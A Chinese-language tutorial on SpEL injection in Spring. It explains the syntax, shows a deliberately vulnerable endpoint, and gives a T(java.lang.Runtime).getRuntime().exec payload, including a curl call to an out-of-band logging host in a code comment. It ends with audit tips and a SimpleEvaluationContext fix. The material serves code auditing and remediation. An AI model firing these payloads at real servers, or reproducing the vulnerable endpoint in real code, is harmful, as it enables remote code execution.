


Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。

# 1.SpEL 基础

在 pom.xml 导入 maven 或是把"org.springframework.expression-3.0.5.RELEASE.jar"添加到类路径中

    <properties>
    	<org.springframework.version>5.0.8.RELEASE</org.springframework.version>
    </properties>
    
    <dependency>
    	<groupId>org.springframework</groupId>
    	<artifactId>spring-expression</artifactId>
    	<version>${org.springframework.version}</version>
    </dependency>
    

## SpEL 使用方式

SpEL 在求表达式值时一般分为四步，其中第三步可选：-
首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。

    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression("('Hello' + ' lisa').concat(#end)");
    EvaluationContext context = new StandardEvaluationContext();
    context.setVariable("end", "!");
    System.out.println(expression.getValue(context));
    

1.创建解析器：**SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；**-
2.解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。-
3.构造上下文：准备比如变量定义等等表达式需要的上下文数据。-
4.求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值。

## spel表达式三种用法

1.  注解
    

    @value("#{表达式}")
    public String arg;
    

这种一般是写死在代码中的，不是关注的重点

2.  xml
    

    <bean id="Bean1" class="com.test.xxx">
    	<property name="arg" value="#{表达式}">
    </bean>
    

这种情况通常也是写死在代码中的，但是也有已知的利用场景，就是利用反序列化让程序加载我们实现构造好的恶意xml文件，如jackson的CVE-2017-17485、weblogic的CVE-2019-2725等。

3.  在代码中处理外部传入的表达式这部分是关注的重点。
    

    @RequestMapping("/spel")
    public String spel(@RequestParam(name = "spel") String spel) {
    	ExpressionParser expressionParser = new SpelExpressionParser();
    	Expression expression =expressionParser.parseExpression(spel);//将spel路径set进去
    	Object object = expression.getValue();//获取到spel执行后的内容
    	return object.toString();
    }
    

## 漏洞利用的前置条件

1.  传入的表达式未过滤
    
2.  表达式解析之后调用了getValue/setValue方法
    
3.  使用StandardEvaluationContext（默认）作为上下文对象
    

# 2.SpEL语法

SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：

> 引用其他对象: #{car}-
> 引用其他对象的属性： #{car.brand}-
> 调用其它方法 , 还可以链式操作： #{car.toString()}

其中属性名称引用还可以用 $符号 如： ${someProperty}-
**除此以外在SpEL中，使用 T() 运算符会调用类作用域的方法和常量。**-
类类型表达式：**使用"T(Type)"来表示 java.lang.Class 实例，"Type"必须是类全限定名，"java.lang"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。**

例如，在SpEL中使用Java的 Math类，我们可以像下面的示例这样使用 T()运算符：-
#{T(java.lang.Math)}-
T()运算符的结果会返回一个 java.lang.Math类对象。

# 3、案例

[http://localhost:8080/spel/vuln?expression=T(java.lang.Runtime).getRuntime().exec('calc')](http://localhost:8080/spel/vuln?expression=T(java.lang.Runtime).getRuntime().exec('calc'))

    /**
         * SpEL to RCE
         * http://localhost:8080/spel/vul/?expression=xxx.
         * xxx is urlencode(exp)
         * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
         */
        @GetMapping("/spel/vuln")
        public String rce(String expression) {
            ExpressionParser parser = new SpelExpressionParser();
            // fix method: SimpleEvaluationContext
            Expression expression1 = parser.parseExpression(expression);
            Object obje = expression1.getValue();
            String obj_str = obje.toString();
            return obj_str;
    	}
    

# 4、审计方法

可以先全局搜索 org.springframework.expression.spel.standard,或是 expression.getValue()、expression.setValue()，定位到具体漏洞代码，再分析传入的参数能不能利用，最后再追踪参数来源，-
看看是否可控。

# 5、修复建议

SimpleEvaluationContext、StandardEvaluationContext 是 SpEL提供的两个 EvaluationContext

> SimpleEvaluationContext - 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 Spal 语言特性和配置选项的子集。-
> StandardEvaluationContext - 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使**用 SimpleEvaluationContext 替换StandardEvaluationContext**-
修复代码：

    @GetMapping("/spel/sec")
    public String spel_sec(String expression) {
    	ExpressionParser parser = new SpelExpressionParser();
    	//只读属性
    	EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    	return parser.parseExpression(expression).getValue(context).toString();
    }
    

# 6、关键词

SpelExpressionParser StandardEvaluationContext#{